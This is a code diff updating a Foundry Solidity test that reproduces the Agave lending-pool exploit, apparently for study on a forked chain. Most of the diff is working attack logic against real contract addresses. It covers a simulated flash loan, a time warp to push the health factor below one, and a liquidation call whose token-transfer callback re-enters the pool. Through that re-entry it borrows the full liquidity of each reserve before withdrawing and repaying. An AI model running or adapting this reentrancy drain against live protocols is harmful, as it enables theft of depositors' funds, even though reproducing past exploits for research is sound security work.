@@ -4,73 +4,6 @@ pragma solidity ^0.8.10;
 import "forge-std/Test.sol";
 import "./interface.sol";
 
-interface ILendingPoolAddressesProvider {
-    event MarketIdSet(string newMarketId);
-    event LendingPoolUpdated(address indexed newAddress);
-    event ConfigurationAdminUpdated(address indexed newAddress);
-    event EmergencyAdminUpdated(address indexed newAddress);
-    event LendingPoolConfiguratorUpdated(address indexed newAddress);
-    event LendingPoolCollateralManagerUpdated(address indexed newAddress);
-    event PriceOracleUpdated(address indexed newAddress);
-    event LendingRateOracleUpdated(address indexed newAddress);
-    event ProxyCreated(bytes32 id, address indexed newAddress);
-    event AddressSet(bytes32 id, address indexed newAddress, bool hasProxy);
-
-    function getMarketId() external view returns (string memory);
-
-    function setMarketId(string calldata marketId) external;
-
-    function setAddress(bytes32 id, address newAddress) external;
-
-    function setAddressAsProxy(bytes32 id, address impl) external;
-
-    function getAddress(bytes32 id) external view returns (address);
-
-    function getLendingPool() external view returns (address);
-
-    function setLendingPoolImpl(address pool) external;
-
-    function getLendingPoolConfigurator() external view returns (address);
-
-    function setLendingPoolConfiguratorImpl(address configurator) external;
-
-    function getLendingPoolCollateralManager() external view returns (address);
-
-    function setLendingPoolCollateralManager(address manager) external;
-
-    function getPoolAdmin() external view returns (address);
-
-    function setPoolAdmin(address admin) external;
-
-    function getEmergencyAdmin() external view returns (address);
-
-    function setEmergencyAdmin(address admin) external;
-
-    function getPriceOracle() external view returns (address);
-
-    function setPriceOracle(address priceOracle) external;
-
-    function getLendingRateOracle() external view returns (address);
-
-    function setLendingRateOracle(address lendingRateOracle) external;
-}
-
-interface ICompoundToken {
-    function borrow(uint256 borrowAmount) external;
-    function repayBorrow(uint256 repayAmount) external;
-    function redeem(uint256 redeemAmount) external;
-    function mint(uint256 amount) external;
-    function comptroller() external view returns (address);
-}
-
-interface IComptroller {
-    function allMarkets() external view returns (address[] memory);
-}
-
-interface ICurve {
-    function exchange(int128 i, int128 j, uint256 _dx, uint256 _min_dy) external;
-}
-
 interface IWeth is IERC20 {
     function deposit() external payable;
     function mint(address, uint256) external returns (bool);
@@ -117,8 +50,10 @@ contract AgaveExploit is Test {
     uint256 linkWithdraw5 = 66_666_666_660_000_000;
 
     uint256 calcount = 0;
+    uint256 wethLiqBeforeHack = 0;
 
     //Asset addrs
+    address aweth = 0xb5A165d9177555418796638447396377Edf4C18a;
     address gno = 0x9C58BAcC331c9aa871AFD802DB6379a98e80CEdb;
     address weth = 0x6A023CCd1ff6F2045C3309768eAd9E68F978f6e1;
     address link = 0xE2e73A1c69ecF83F464EFCE6A5be353a37cA09b2;
@@ -135,8 +70,6 @@ contract AgaveExploit is Test {
     IPriceOracleGetter priceOracle;
 
     // Contract / exchange interfaces
-    ICurve curve = ICurve(0x7f90122BF0700F9E7e1F688fe926940E8839F353);
-    IUniswapV2Router private constant router = IUniswapV2Router(payable(0x1C232F01118CB8B424793ae03F870aa7D0ac7f77));
     ILendingPoolAddressesProvider providerAddrs;
     ILendingPool lendingPool;
 
@@ -158,6 +91,7 @@ contract AgaveExploit is Test {
         console.log(providerAddrs.getPriceOracle());
         //Lets just mint weth to this contract for initial debt
         vm.startPrank(0xf6A78083ca3e2a662D6dd1703c939c8aCE2e268d);
+        wethLiqBeforeHack = getAvailableLiquidity(weth);
         //Mint initial weth funding
         WETH.mint(address(this), 2728.934387414251504146 ether);
         WETH.mint(address(this), 1);
@@ -165,10 +99,14 @@ contract AgaveExploit is Test {
         LINK.mint(address(this), linkLendNum1);
         vm.stopPrank();
 
-        //Lets run setup functio
         //Approve funds
         LINK.approve(address(lendingPool), type(uint256).max);
         WETH.approve(address(lendingPool), type(uint256).max);
+    }
+
+    function getAvailableLiquidity(address asset) internal view returns (uint256 reserveTokenbal) {
+        DataTypesAave.ReserveData memory data = lendingPool.getReserveData(asset);
+        reserveTokenbal = IERC20(asset).balanceOf(address(data.aTokenAddress));
     }
 
     function getHealthFactor() public view returns (uint256) {
@@ -203,25 +141,29 @@ contract AgaveExploit is Test {
         return IERC20(asset).balanceOf(address(this));
     }
 
-    function _logBalances() internal {
+    function _logBalances(string memory message) internal {
+        console.log(message);
+        console.log("--- Start of balances --- ");
         console.log("WETH Balance %d", _logTokenBal(weth));
-        console.log("aWETH Balance %d", _logTokenBal(address(lendingPool.getReserveData(weth).aTokenAddress)));
+        console.log("aWETH Balance %d", _logTokenBal(aweth));
         console.log("USDC Balance %d", _logTokenBal(usdc));
         console.log("GNO Balance %d", _logTokenBal(gno));
         console.log("LINK Balance %d", _logTokenBal(link));
         console.log("WBTC Balance %d", _logTokenBal(wbtc));
         console.log("healthf : %d", getHealthFactor());
+        console.log("--- End of balances --- ");
     }
 
     function testExploit() public {
         //Call prepare and get it setup
         prepare();
+        _logBalances("Before hack balances");
         console.log("healthf : %d", getHealthFactor());
-        borrow();
-        _logBalances();
+        flashloanFundingWETH();
+        _logBalances("After hack balances");
     }
 
-    function borrow() internal {
+    function flashloanFundingWETH() internal {
         this.uniswapV2Call(address(this), 2730 ether, 0, new bytes(0));
     }
 
@@ -234,32 +176,25 @@ contract AgaveExploit is Test {
         uint256 amountToken = _amount0 == 0 ? _amount1 : _amount0;
         totalBorrowed = amountToken;
         console.log("Borrowed: %s WETH from Honey", totalBorrowed);
+        //This will fast forward block number and timestamp to cause hf to be lower due to interest on loan pushing hf below one
         vm.warp(block.timestamp + 1 hours);
         vm.roll(block.number + 1);
         console.log("healthfAfterAdjust : %d", getHealthFactor());
         //This will start the reentrancy with ontokentransfer call on .burn of the atoken
         lendingPool.liquidationCall(weth, weth, address(this), 2, false);
         //This will withdraw the funds from weth lending pool
-        lendingPool.withdraw(weth, _logTokenBal(address(lendingPool.getReserveData(weth).aTokenAddress)), address(this));
-        _logBalances();
-
-        /*I have skipped this check since i didnt include swapping a token for weth to pay for the flashloan fees which come extra
-        the amount missing is 1 eth or so which is negligible 
-        Theres also a caveat that the weth lending pool isnt taken in this example but this shows how the agave exploit worked 90% wise so should be ok
-        */
-
-        /* Uncomment this to Check for weth bal being bigger than flashloan debt
+        lendingPool.withdraw(weth, _logTokenBal(aweth), address(this));
+        //Calculation of flashloan fees for uniswap v2 pair,we just emulate it here for continuity purposes
         uint256 amountRepay = ((amountToken * 1000) / 997) + 1;
         uint256 wethbal = WETH.balanceOf(address(this));
-        uint256 remainingeth = totalBorrowed - wethbal;
-         if(wethbal < totalBorrowed  ) {
-            console.log('Remaining eth is %d',totalBorrowed - wethbal);
-            _logBalances();
+        uint256 remainingeth = wethbal > totalBorrowed ? 0 : totalBorrowed - wethbal;
+        if (wethbal < totalBorrowed) {
+            console.log("Remaining eth is %d", totalBorrowed - wethbal);
         }
-        require(amountRepay < WETH.balanceOf(address(this)),'not enough eth');
-         WETH.transfer(msg.sender, amountRepay);
-        console.log("Repay Flashloan for : %s USDC", amountRepay/1e6);
-        */
+        require(amountRepay < WETH.balanceOf(address(this)), "not enough eth");
+        //For test case we just send it to address(1) to reduce the flashloan amount from us to get final assets
+        WETH.transfer(address(1), amountRepay);
+        console.log("Repay Flashloan for : %s WETH", amountRepay / 1e18);
     }
 
     function getMaxBorrow(address asset, uint256 depositedamt) public view returns (uint256) {
@@ -299,8 +234,7 @@ contract AgaveExploit is Test {
     function maxBorrow(address asset, bool maxxx) internal {
         IERC20 assetX = IERC20(asset);
         uint256 assetXbal = assetX.balanceOf(address(this));
-        DataTypesAave.ReserveData memory data = lendingPool.getReserveData(asset);
-        uint256 reserveTokenbal = IERC20(asset).balanceOf(address(data.aTokenAddress));
+        uint256 reserveTokenbal = getAvailableLiquidity(asset);
         console.log("Amont of asset bal in atoken is %d", reserveTokenbal);
         uint256 BorrowAmount = maxxx ? reserveTokenbal - 1 : min(getMaxBorrow(asset, totalBorrowed), reserveTokenbal);
         if (BorrowAmount > 0) {
@@ -322,21 +256,17 @@ contract AgaveExploit is Test {
         maxBorrow(wbtc, true);
         maxBorrow(gno, true);
         maxBorrow(wxdai, true);
-        // maxBorrow(weth,true);
-
-        _logBalances();
+        //We borrow directly here cause of some edge case the maxborrow fails for weth
+        lendingPool.borrow(weth, wethLiqBeforeHack, 2, 0, address(this));
     }
 
     function onTokenTransfer(address _from, uint256 _value, bytes memory _data) external {
         console.log("tokencall From: %s, Value: %d", _from, _value);
-
-        IUniswapV2Factory factory = IUniswapV2Factory(router.factory());
-        address pair = factory.getPair(address(gno), address(weth));
         //we only do the borrow call on liquidation call which is the second time the from is weth and value is 1
-        if (_from == 0xb5A165d9177555418796638447396377Edf4C18a && _value == 1) {
+        if (_from == aweth && _value == 1) {
             calcount++;
         }
-        if (calcount == 2 && _from == 0xb5A165d9177555418796638447396377Edf4C18a && _value == 1) {
+        if (calcount == 2 && _from == aweth && _value == 1) {
             borrowMaxtokens();
         }
     }
